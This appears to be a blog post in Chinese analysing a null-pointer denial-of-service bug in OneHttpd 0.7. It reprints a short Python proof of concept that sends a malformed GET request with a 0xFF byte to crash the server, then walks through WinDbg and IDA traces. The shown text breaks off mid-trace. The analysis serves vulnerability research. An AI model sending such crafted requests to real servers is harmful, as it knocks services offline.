@@ -1,0 +1,346 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>OneHttpd_0.7空指针引用拒绝服务漏洞 | The Space Between Us</title><meta property="og:title" content="OneHttpd_0.7空指针引用拒绝服务漏洞 | The Space Between Us"><meta name=twitter:title content="OneHttpd_0.7空指针引用拒绝服务漏洞 | The Space Between Us"><meta itemprop=name content="OneHttpd_0.7空指针引用拒绝服务漏洞 | The Space Between Us"><meta name=application-name content="OneHttpd_0.7空指针引用拒绝服务漏洞 | The Space Between Us"><meta property="og:site_name" content="Vincebye's Blog"><meta name=description content="Minimal Hugo blog theme with light and dark mode support"><meta itemprop=description content="Minimal Hugo blog theme with light and dark mode support"><meta property="og:description" content="Minimal Hugo blog theme with light and dark mode support"><meta name=twitter:description content="Minimal Hugo blog theme with light and dark mode support"><meta property="og:locale" content="en-us"><meta name=language content="en-us"><meta itemprop=image content="https://vincebye.github.io/"><meta property="og:image" content="https://vincebye.github.io/"><meta name=twitter:image content="https://vincebye.github.io/"><meta name=twitter:image:src content="https://vincebye.github.io/"><meta property="og:type" content="article"><meta property="og:article:published_time" content="2020-04-03T14:20:12+0800"><meta property="article:published_time" content="2020-04-03T14:20:12+0800"><script defer type=application/ld+json>{"@context":"http://schema.org","@type":"Article","headline":"OneHttpd_0.7空指针引用拒绝服务漏洞","author":{"@type":"Person","name":""},"datePublished":"2020-04-03","description":"","wordCount":1792,"mainEntityOfPage":"True","dateModified":"2020-04-03","image":{"@type":"imageObject","url":""},"publisher":{"@type":"Organization","name":"The Space Between Us"}}</script><meta name=generator content="Hugo 0.111.3"><script async src="https://www.googletagmanager.com/gtag/js?id=G-GKH5P9VW55"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-GKH5P9VW55")</script><link rel=canonical href=https://vincebye.github.io/posts/onehttpd_0.7%E7%A9%BA%E6%8C%87%E9%92%88%E5%BC%95%E7%94%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/><link href=/sass/main.min.0eebb6db90b4ec9f4444ef402f08421ee056025ba860df3d749a9f299d472008.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/images/favicon/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/images/favicon/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/images/favicon/favicon-16x16.png><link rel=manifest href=/images/favicon/site.webmanifest><link rel=mask-icon href=/images/favicon/safari-pinned-tab.svg color=#5bbad5><link rel="shortcut icon" href=/images/favicon/favicon.ico><meta name=msapplication-TileColor content="#2b5797"><meta name=msapplication-config content="/images/favicon/browserconfig.xml"><meta name=theme-color content="#ffffff"><link rel=icon type=image/svg+xml href=/images/favicon/favicon.svg><script async src="https://www.googletagmanager.com/gtag/js?id=G-GKH5P9VW55"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-GKH5P9VW55",{anonymize_ip:!1})}</script></head><body data-theme=dark class=notransition><script src=https://vincebye.github.io/js/themeLoader.min.4e9e1a253d543bbfec02e7f2460d9621e719fd739dc8a5256faa91cda6e12e03.js></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=/ class=logo><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></a><input type=checkbox id=menu-trigger class=menu-trigger>
+<label for=menu-trigger><span class=menu-icon><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentcolor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class="menu-link active" href=/posts/>Posts</a></li><li><a class=menu-link href=/about/>About</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg><svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post">   <main class=page-content aria-label=Content>       <article>           <header class=header>               <h1 class=header-title>OneHttpd_0.7空指针引用拒绝服务漏洞</h1>               
+               <div class=post-meta>                    <time datetime=2020-04-03T14:20:12+08:00 itemprop=datePublished>3 Apr 2020</time>
+               </div>           </header>           <div class=page-content>               <h1 id=onehttpd-07空指针引用拒绝服务漏洞>OneHttpd 0.7空指针引用拒绝服务漏洞</h1><h1 id=漏洞情况>漏洞情况</h1><p>WinXP Pro</p><p>Windbg</p><p>IDA</p><p><a href=https://www.exploit-db.com/apps/c95b319ff6ad98fef110303302b1b535-onehttpd-0.7.exe>OneHttpd 0.7</a></p><p><a href=https://www.exploit-db.com/exploits/27553>https://www.exploit-db.com/exploits/27553</a></p><h1 id=漏洞复现>漏洞复现</h1><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
+</span></span><span class=line><span class=cl><span class=c1># Exploit Title: onehttpd 0.7 Denial of Service</span>
+</span></span><span class=line><span class=cl><span class=c1># Date: 12 Aug 2013</span>
+</span></span><span class=line><span class=cl><span class=c1># Exploit Author: superkojiman - http://www.techorganic.com</span>
+</span></span><span class=line><span class=cl><span class=c1># Vendor Homepage: https://code.google.com/p/onehttpd/</span>
+</span></span><span class=line><span class=cl><span class=c1># Version: onehttpd 0.7</span>
+</span></span><span class=line><span class=cl><span class=c1># Tested on: Windows 7 Ultimate English</span>
+</span></span><span class=line><span class=cl><span class=c1>#            Windows XP SP2 English</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>socket</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span>  <span class=p>(</span> 
+</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s2>&#34;GET /</span><span class=se>\xFF</span><span class=s2> HTTP/1.1</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span> 
+</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s2>&#34;Host: 192.168.137.129</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span> 
+</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>socket</span><span class=p>(</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>SOCK_STREAM</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=s2>&#34;192.168.137.129&#34;</span><span class=p>,</span> <span class=mi>8080</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span></code></pre></div><p>崩溃如图</p><p>!https://s3-us-west-2.amazonaws.com/secure.notion-static.com/caaa72b2-5535-4a80-abe9-f7f13b0da658/Untitled.png</p><p>OS：拒绝服务攻击也是导致崩溃？或者是其中一种现象，能覆盖SEH链地址则为代码执行，不能则只能造成拒绝服务攻击</p><p>接着上WindDBG进行附加调试，按g之后运行Poc文件触发崩溃</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=mi>0</span><span class=p>:</span><span class=mi>001</span><span class=o>&gt;</span> <span class=n>g</span>
+</span></span><span class=line><span class=cl><span class=p>(</span><span class=n>d70</span><span class=mf>.7</span><span class=n>d0</span><span class=p>):</span> <span class=n>Access</span> <span class=n>violation</span> <span class=o>-</span> <span class=n>code</span> <span class=n>c0000005</span> <span class=p>(</span><span class=n>first</span> <span class=n>chance</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>First</span> <span class=n>chance</span> <span class=n>exceptions</span> <span class=n>are</span> <span class=n>reported</span> <span class=n>before</span> <span class=nb>any</span> <span class=n>exception</span> <span class=n>handling</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=n>This</span> <span class=n>exception</span> <span class=n>may</span> <span class=n>be</span> <span class=n>expected</span> <span class=ow>and</span> <span class=n>handled</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=n>eax</span><span class=o>=</span><span class=mi>00000000</span> <span class=n>ebx</span><span class=o>=</span><span class=mf>003e49</span><span class=n>f8</span> <span class=n>ecx</span><span class=o>=</span><span class=mi>00000000</span> <span class=n>edx</span><span class=o>=</span><span class=mf>003e3818</span> <span class=n>esi</span><span class=o>=</span><span class=mi>0000002</span><span class=n>a</span> <span class=n>edi</span><span class=o>=</span><span class=mi>00000000</span>
+</span></span><span class=line><span class=cl><span class=n>eip</span><span class=o>=</span><span class=mi>004015</span><span class=n>a4</span> <span class=n>esp</span><span class=o>=</span><span class=mi>0020</span><span class=n>fc40</span> <span class=n>ebp</span><span class=o>=</span><span class=mi>0020</span><span class=n>fc58</span> <span class=n>iopl</span><span class=o>=</span><span class=mi>0</span>         <span class=n>nv</span> <span class=n>up</span> <span class=n>ei</span> <span class=n>pl</span> <span class=n>zr</span> <span class=n>na</span> <span class=n>pe</span> <span class=n>nc</span>
+</span></span><span class=line><span class=cl><span class=n>cs</span><span class=o>=</span><span class=mi>001</span><span class=n>b</span>  <span class=n>ss</span><span class=o>=</span><span class=mi>0023</span>  <span class=n>ds</span><span class=o>=</span><span class=mi>0023</span>  <span class=n>es</span><span class=o>=</span><span class=mi>0023</span>  <span class=n>fs</span><span class=o>=</span><span class=mi>003</span><span class=n>b</span>  <span class=n>gs</span><span class=o>=</span><span class=mi>0000</span>             <span class=n>efl</span><span class=o>=</span><span class=mi>00010246</span>
+</span></span><span class=line><span class=cl><span class=o>***</span> <span class=n>ERROR</span><span class=p>:</span> <span class=n>Module</span> <span class=n>load</span> <span class=n>completed</span> <span class=n>but</span> <span class=n>symbols</span> <span class=n>could</span> <span class=ow>not</span> <span class=n>be</span> <span class=n>loaded</span> <span class=k>for</span> <span class=n>C</span><span class=p>:</span>\<span class=n>Vul</span>\<span class=n>onehttpd</span><span class=o>.</span><span class=n>exe</span>
+</span></span><span class=line><span class=cl><span class=n>onehttpd</span><span class=o>+</span><span class=mh>0x15a4</span><span class=p>:</span>
+</span></span><span class=line><span class=cl><span class=mi>004015</span><span class=n>a4</span> <span class=mi>8</span><span class=n>a07</span>            <span class=n>mov</span>     <span class=n>al</span><span class=p>,</span><span class=n>byte</span> <span class=n>ptr</span> <span class=p>[</span><span class=n>edi</span><span class=p>]</span>          <span class=n>ds</span><span class=p>:</span><span class=mi>0023</span><span class=p>:</span><span class=mi>00000000</span><span class=o>=</span><span class=err>??</span>
+</span></span></code></pre></div><p>此处mov al,byte ptr [edi]将edi所指向的值赋给al(eax低位)，然后edi=00000000，由此造成了空指针引用</p><p>kb查看调用堆栈</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=mi>0</span><span class=p>:</span><span class=mi>000</span><span class=o>&gt;</span> <span class=n>kb</span>
+</span></span><span class=line><span class=cl><span class=n>ChildEBP</span> <span class=n>RetAddr</span>  <span class=n>Args</span> <span class=n>to</span> <span class=n>Child</span>              
+</span></span><span class=line><span class=cl><span class=n>WARNING</span><span class=p>:</span> <span class=n>Stack</span> <span class=n>unwind</span> <span class=n>information</span> <span class=ow>not</span> <span class=n>available</span><span class=o>.</span> <span class=n>Following</span> <span class=n>frames</span> <span class=n>may</span> <span class=n>be</span> <span class=n>wrong</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>0020</span><span class=n>fc58</span> <span class=mi>00404202</span> <span class=mi>009</span><span class=n>d004c</span> <span class=mf>003e3818</span> <span class=mi>00000000</span> <span class=n>onehttpd</span><span class=o>+</span><span class=mh>0x15a4</span>
+</span></span><span class=line><span class=cl><span class=mi>0020</span><span class=n>fc98</span> <span class=mi>004045</span><span class=n>ce</span> <span class=mf>003e49</span><span class=n>f8</span> <span class=mi>00248</span><span class=n>db8</span> <span class=mi>00000000</span> <span class=n>onehttpd</span><span class=o>+</span><span class=mh>0x4202</span>
+</span></span><span class=line><span class=cl><span class=mi>0020</span><span class=n>fcd8</span> <span class=mi>00404</span><span class=n>ae9</span> <span class=mf>003e49</span><span class=n>f8</span> <span class=mi>0020</span><span class=n>fcfc</span> <span class=mi>0000002</span><span class=n>a</span> <span class=n>onehttpd</span><span class=o>+</span><span class=mh>0x45ce</span>
+</span></span><span class=line><span class=cl><span class=mi>0022</span><span class=n>ff28</span> <span class=mi>00404</span><span class=n>d41</span> <span class=mi>000007</span><span class=n>a0</span> <span class=mf>003e3838</span> <span class=mi>0022</span><span class=n>ff58</span> <span class=n>onehttpd</span><span class=o>+</span><span class=mh>0x4ae9</span>
+</span></span><span class=line><span class=cl><span class=mi>0022</span><span class=n>ff58</span> <span class=mi>004010</span><span class=n>a7</span> <span class=mi>004012</span><span class=n>f0</span> <span class=mi>00401066</span> <span class=mi>0022</span><span class=n>ff78</span> <span class=n>onehttpd</span><span class=o>+</span><span class=mh>0x4d41</span>
+</span></span><span class=line><span class=cl><span class=mi>0022</span><span class=n>ffa0</span> <span class=mi>00401143</span> <span class=mi>00000001</span> <span class=mi>8061850</span><span class=n>d</span> <span class=mi>7</span><span class=n>c92dc9c</span> <span class=n>onehttpd</span><span class=o>+</span><span class=mh>0x10a7</span>
+</span></span><span class=line><span class=cl><span class=o>***</span> <span class=n>ERROR</span><span class=p>:</span> <span class=n>Symbol</span> <span class=n>file</span> <span class=n>could</span> <span class=ow>not</span> <span class=n>be</span> <span class=n>found</span><span class=o>.</span>  <span class=n>Defaulted</span> <span class=n>to</span> <span class=n>export</span> <span class=n>symbols</span> <span class=k>for</span> <span class=n>C</span><span class=p>:</span>\<span class=n>WINDOWS</span>\<span class=n>system32</span>\<span class=n>kernel32</span><span class=o>.</span><span class=n>dll</span> <span class=o>-</span> 
+</span></span><span class=line><span class=cl><span class=mi>0022</span><span class=n>ffc0</span> <span class=mi>7</span><span class=n>c817067</span> <span class=mi>94</span><span class=n>af5a44</span> <span class=mi>01</span><span class=n>d73bd1</span> <span class=mi>7</span><span class=n>ffdf000</span> <span class=n>onehttpd</span><span class=o>+</span><span class=mh>0x1143</span>
+</span></span><span class=line><span class=cl><span class=mi>0022</span><span class=n>fff0</span> <span class=mi>00000000</span> <span class=mi>00401130</span> <span class=mi>00000000</span> <span class=mi>78746341</span> <span class=n>kernel32</span><span class=err>!</span><span class=n>RegisterWaitForInputIdle</span><span class=o>+</span><span class=mh>0x49</span>
+</span></span></code></pre></div><p>00404202为正在调用的函数的返回地址，我们用IDA查看一下</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>004041</span><span class=n>EC</span>                 <span class=n>push</span>    <span class=n>ecx</span>             <span class=p>;</span> <span class=n>Size</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>004041</span><span class=n>ED</span>                 <span class=n>call</span>    <span class=n>malloc</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>004041</span><span class=n>F2</span>                 <span class=n>add</span>     <span class=n>esp</span><span class=p>,</span> <span class=mi>0</span><span class=n>Ch</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>004041</span><span class=n>F5</span>                 <span class=n>mov</span>     <span class=n>edi</span><span class=p>,</span> <span class=n>eax</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>004041</span><span class=n>F7</span>                 <span class=n>push</span>    <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>004041</span><span class=n>F9</span>                 <span class=n>push</span>    <span class=n>eax</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>004041</span><span class=n>FA</span>                 <span class=n>push</span>    <span class=n>dword</span> <span class=n>ptr</span> <span class=p>[</span><span class=n>ebx</span><span class=o>+</span><span class=mi>58</span><span class=n>h</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>004041</span><span class=n>FD</span>                 <span class=n>call</span>    <span class=n>sub_401581</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>00404202</span>                 <span class=n>add</span>     <span class=n>esp</span><span class=p>,</span> <span class=mi>10</span><span class=n>h</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>00404205</span>                 <span class=n>test</span>    <span class=n>eax</span><span class=p>,</span> <span class=n>eax</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>00404</span> <span class=mi>207</span>                 <span class=n>jnz</span>     <span class=n>loc_404348</span>
+</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>text</span><span class=p>:</span><span class=mi>0040420</span><span class=n>D</span>                 <span class=n>cmp</span>     <span class=n>dword_40A008</span><span class=p>,</span> <span class=mi>3</span>
+</span></span></code></pre></div><p>可以看到004041FD有运行了一个函数sub_401581，我们尝试跟进一下，用WinDBG在004041FD上下一个断点</p><pre tabindex=0><code>0:001&gt; bp 004041FD
+0:001&gt; g
+Breakpoint 0 hit
+eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
+eip=004041fd esp=0020fc60 ebp=0020fc98 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+onehttpd+0x41fd:
+004041fd e87fd3ffff      call    onehttpd+0x1581 (00401581)
+0:000&gt; t//跟进00401581这个函数
+eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
+eip=00401581 esp=0020fc5c ebp=0020fc98 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+onehttpd+0x1581:
+00401581 55              push    ebp
+0:000&gt; p
+eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
+eip=00401582 esp=0020fc58 ebp=0020fc98 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+onehttpd+0x1582:
+00401582 89e5            mov     ebp,esp
+0:000&gt; p
+eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
+eip=00401584 esp=0020fc58 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+onehttpd+0x1584:
+00401584 57              push    edi
+0:000&gt; p
+eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
+eip=00401585 esp=0020fc54 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+onehttpd+0x1585:
+00401585 56              push    esi
+0:000&gt; p
+eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
+eip=00401586 esp=0020fc50 ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+onehttpd+0x1586:
+00401586 53              push    ebx
+0:000&gt; p
+eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
+eip=00401587 esp=0020fc4c ebp=0020fc58 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+onehttpd+0x1587:
+00401587 83ec0c          sub     esp,0Ch
+0:000&gt; p
+eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
+eip=0040158a esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+onehttpd+0x158a:
+0040158a 8b450c          mov     eax,dword ptr [ebp+0Ch] ss:0023:0020fc64=003e3818
+0:000&gt; p
+eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=003e3818
+eip=0040158d esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+onehttpd+0x158d:
+0040158d 8b7d08          mov     edi,dword ptr [ebp+8] ss:0023:0020fc60=009d004c//将[ebp+8]所指向的值（009d004c）赋给edi 而009d004c由上可知为paylaod存储地址
+0:000&gt; p
+eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
+eip=00401590 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+onehttpd+0x1590:
+00401590 8945f0          mov     dword ptr [ebp-10h],eax ss:0023:0020fc48=0020fc58
+0:000&gt; p
+eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
+eip=00401593 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+onehttpd+0x1593:
+00401593 e9e8000000      jmp     onehttpd+0x1680 (00401680)
+0:000&gt; p
+eax=003e3818 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
+eip=00401680 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+onehttpd+0x1680:
+00401680 8a07            mov     al,byte ptr [edi]          ds:0023:009d004c=2f//将[edi]所指向的值(2f)赋值给eax的低位al
+0:000&gt; p
+eax=003e382f ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
+eip=00401682 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+onehttpd+0x1682:
+00401682 84c0            test    al,al//判断al是否为0，此处不为0
+0:000&gt; p
+eax=003e382f ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
+eip=00401684 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+onehttpd+0x1684:
+00401684 0f850effffff    jne     onehttpd+0x1598 (00401598)              [br=1]//因上一条结果不为0，所以此处不跳转
+0:000&gt; p
+eax=003e382f ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
+eip=00401598 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+onehttpd+0x1598:
+00401598 3c1f            cmp     al,1Fh
+0:000&gt; p
+eax=003e382f ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
+eip=0040159a esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+onehttpd+0x159a:
+0040159a 0f9fc0          setg    al//当上面al&gt;1Fh时，al就会被置1，否则置0
+0:000&gt; p
+eax=003e3801 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
+eip=0040159d esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+onehttpd+0x159d:
+0040159d 0fb6c0          movzx   eax,al//取eax的低8位01,其余位置0，即0000000001
+0:000&gt; p
+eax=00000001 ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
+eip=004015a0 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+onehttpd+0x15a0:
+004015a0 f7d8            neg     eax//eax求补（注意与求补码区别），取反加一
+0:000&gt; p
+eax=ffffffff ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
+eip=004015a2 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei ng nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
+onehttpd+0x15a2:
+004015a2 21c7            and     edi,eax//edi与eax相与，结果保存到edi
+0:000&gt; p
+eax=ffffffff ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
+eip=004015a4 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+onehttpd+0x15a4:
+004015a4 8a07            mov     al,byte ptr [edi]          ds:0023:009d004c=2f
+0:000&gt; p
+eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=00020001 esi=0000002a edi=009d004c
+eip=004015a6 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+onehttpd+0x15a6:
+004015a6 0fbed0          movsx   edx,al//al(2f 0010 1111)首位为0，则edx高8位全置为0，结果为0000 0000 0010 1111
+0:000&gt; p
+eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
+eip=004015a9 esp=0020fc40 ebp=0020fc58 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+onehttpd+0x15a9:
+004015a9 3c23            cmp     al,23h
+0:000&gt; p
+eax=ffffff2f ebx=003e49f8 ecx=00000000 edx=0000002f esi=0000002a edi=009d004c
